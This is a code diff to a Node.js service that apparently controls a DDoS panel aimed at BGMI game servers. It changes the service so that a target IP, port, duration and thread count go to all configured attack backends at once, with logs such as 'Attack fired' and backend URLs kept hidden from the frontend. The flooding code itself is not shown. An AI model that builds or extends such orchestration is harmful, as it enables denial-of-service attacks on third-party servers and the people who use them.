@@ -1,12 +1,11 @@
 const axios = require('axios');
-const { bgmiApis, maxRetries, timeouts } = require('../config/bgmiConfig');
+const { bgmiApis, timeouts } = require('../config/bgmiConfig');
 
 class BGMIService {
     constructor() {
         this.currentApiIndex = 0;
     }
 
-    // ── Initialize (called on server start) ──────────────────────────────────
     async initialize() {
         if (bgmiApis.length === 0) {
             throw new Error('No BGMI API URLs configured');
@@ -14,7 +13,6 @@ class BGMIService {
         console.log(`🎮 BGMIService initialized with ${bgmiApis.length} endpoints`);
     }
 
-    // ── Health check across all APIs ─────────────────────────────────────────
     async checkHealth() {
         const results = await Promise.allSettled(
             bgmiApis.map(url =>
@@ -34,94 +32,84 @@ class BGMIService {
         };
     }
 
-    // ── Get count of configured APIs ─────────────────────────────────────────
     getApiCount() {
         return bgmiApis.length;
     }
 
-    // ── Round-robin load balancing ───────────────────────────────────────────
-    getNextApi() {
-        const api = bgmiApis[this.currentApiIndex];
-        this.currentApiIndex = (this.currentApiIndex + 1) % bgmiApis.length;
-        return api;
-    }
-
-    // ── Start a server with retry logic ─────────────────────────────────────
+    // ── Fire ALL servers simultaneously ──────────────────────────────────────
     async startServer(ip, port, duration, threads = 1) {
-        let lastError = null;
-
-        for (let i = 0; i < maxRetries; i++) {
-            const apiUrl = this.getNextApi();
-            try {
-                const response = await axios.post(
+        const results = await Promise.allSettled(
+            bgmiApis.map(apiUrl =>
+                axios.post(
                     `${apiUrl}/start-server`,
                     { ip, port, duration, threads },
                     { timeout: timeouts.startServer }
-                );
+                ).then(response => ({ apiUrl, data: response.data }))
+            )
+        );
 
-                if (response.data.status === 'success') {
-                    return {
-                        success: true,
-                        data: response.data,
-                        apiUrl
-                    };
-                }
-            } catch (error) {
-                lastError = error;
-                console.error(`Attempt ${i + 1} failed for ${apiUrl}:`, error.message);
-            }
+        const succeeded = results
+            .filter(r => r.status === 'fulfilled' && r.value.data?.status === 'success')
+            .map(r => r.value.apiUrl);
+
+        const failed = results.filter(r =>
+            r.status === 'rejected' ||
+            (r.status === 'fulfilled' && r.value.data?.status !== 'success')
+        ).length;
+
+        console.log(`🚀 Attack fired: ${succeeded.length}/${bgmiApis.length} servers started, ${failed} failed`);
+
+        if (succeeded.length === 0) {
+            return {
+                success: false,
+                error: 'All API servers failed to start'
+            };
         }
 
+        // Return success — we don't expose individual server URLs
         return {
-            success: false,
-            error: lastError?.response?.data || lastError?.message || 'All attempts failed'
+            success: true,
+            serversStarted: succeeded.length,
+            totalServers: bgmiApis.length,
+            // Internal use only — panel.js stores this, never sends to frontend
+            _activeUrls: succeeded
         };
     }
 
-    // ── Stop a running server ────────────────────────────────────────────────
-    async stopServer(apiUrl) {
-        try {
-            const response = await axios.post(
-                `${apiUrl}/stop-server`,
-                {},
-                { timeout: timeouts.stopServer }
-            );
-            return {
-                success: response.data.status === 'success',
-                data: response.data
-            };
-        } catch (error) {
-            return {
-                success: false,
-                error: error.response?.data || error.message
-            };
-        }
+    // ── Stop all servers that were started for this attack ───────────────────
+    async stopServers(activeUrls) {
+        if (!activeUrls || activeUrls.length === 0) return { success: true };
+
+        const results = await Promise.allSettled(
+            activeUrls.map(apiUrl =>
+                axios.post(
+                    `${apiUrl}/stop-server`,
+                    {},
+                    { timeout: timeouts.stopServer }
+                )
+            )
+        );
+
+        const stopped = results.filter(r => r.status === 'fulfilled').length;
+        console.log(`🛑 Stop sent to ${stopped}/${activeUrls.length} servers`);
+
+        return { success: true, stopped, total: activeUrls.length };
     }
 
-    // ── Get status of a running server ───────────────────────────────────────
     async getStatus(apiUrl) {
         try {
             const response = await axios.get(
                 `${apiUrl}/status`,
                 { timeout: timeouts.statusCheck }
             );
-            return {
-                success: true,
-                data: response.data
-            };
+            return { success: true, data: response.data };
         } catch (error) {
-            return {
-                success: false,
-                error: error.response?.data || error.message
-            };
+            return { success: false, error: error.response?.data || error.message };
         }
     }
 
-    // ── Cleanup all running servers (called on SIGTERM) ──────────────────────
     async cleanup() {
         console.log('🧹 BGMIService cleanup called');
-        // Nothing persistent to clean up in this implementation,
-        // but the hook exists for future use (e.g. tracking active servers in-memory)
     }
 }
 
